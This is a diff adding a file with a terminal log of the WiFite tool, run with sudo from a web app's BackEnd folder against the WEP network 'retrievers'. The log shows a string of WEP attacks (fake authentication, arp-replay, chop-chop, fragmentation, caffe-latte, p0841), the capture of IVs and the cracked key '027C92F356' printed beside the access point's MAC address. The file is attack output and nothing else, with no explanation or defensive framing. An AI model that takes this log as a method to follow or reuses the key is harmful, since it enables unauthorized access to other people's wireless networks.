@@ -1,0 +1,54 @@
+~/Documents/repo/SRR-webapp/BackEnd $ sudo ./newWifite -e retrievers
+
+  .;'                     `;,
+   .;'  ,;'             `;,  `;,   WiFite v2 (r85)
+   .;'  ,;'  ,;'     `;,  `;,  `;,
+   ::   ::   :   ( )   :   ::   ::  automated wireless auditor
+   ':.  ':.  ':. /_\ ,:'  ,:'  ,:'
+    ':.  ':.    /___\    ,:'  ,:'   designed for Linux
+      ':.       /_____\      ,:'
+                 /       \
+
+ [+] targeting ESSID "retrievers"
+
+ [!] the program cowpatty is not required, but is recommended
+
+ [+] scanning for wireless devices...
+  [+] enabling monitor mode on wlan0... done
+   [+] initializing scan (mon0), updates at 5 sec intervals, CTRL+C when ready.
+    [0:00:04] scanning wireless networks. 0 targets and 0 clients found
+     [+] checking for WPS compatibility... done
+
+ [!] you have already cracked this access point's key!
+  [!] retrievers: "027C92F356"
+  cracking again.
+
+ [0:10:00] preparing attack "retrievers" (C0:56:27:21:93:38)
+  [0:10:00] attempting fake authentication (5/5)...  failed
+   [0:10:00] attacking "retrievers" via arp-replay attack
+    [0:09:54] attack failed: aireplay-ng exited unexpectedly
+     [0:10:00] attempting fake authentication (5/5)...  failed
+      [0:10:00] attacking "retrievers" via chop-chop attack
+       [0:09:54] attack failed: unable to generate keystream
+        [0:10:00] attempting fake authentication (5/5)...  failed
+	 [0:10:00] attacking "retrievers" via fragmentation attack
+	  [0:09:54] attack failed: unable to generate keystream
+	   [0:10:00] attempting fake authentication (5/5)...  failed
+	    [0:10:00] attacking "retrievers" via caffe-latte attack
+	     [0:09:54] attack failed: aireplay-ng exited unexpectedly
+	      [0:10:00] attempting fake authentication (5/5)...  failed
+	       [0:10:00] attacking "retrievers" via p0841 attack
+	        [0:08:54] started cracking (over 10000 ivs)
+		 [0:06:00] captured 28209 ivs @ 125 iv/sec
+
+ [0:06:00] cracked retrievers (C0:56:27:21:93:38)! key: "027C92F356"
+
+ [+] 1 attack completed:
+
+ [+] 1/1 WEP attacks succeeded
+         cracked retrievers (C0:56:27:21:93:38), key: "027C92F356"
+
+
+ [+] disabling monitor mode on mon0... done
+  [+] quitting
+  
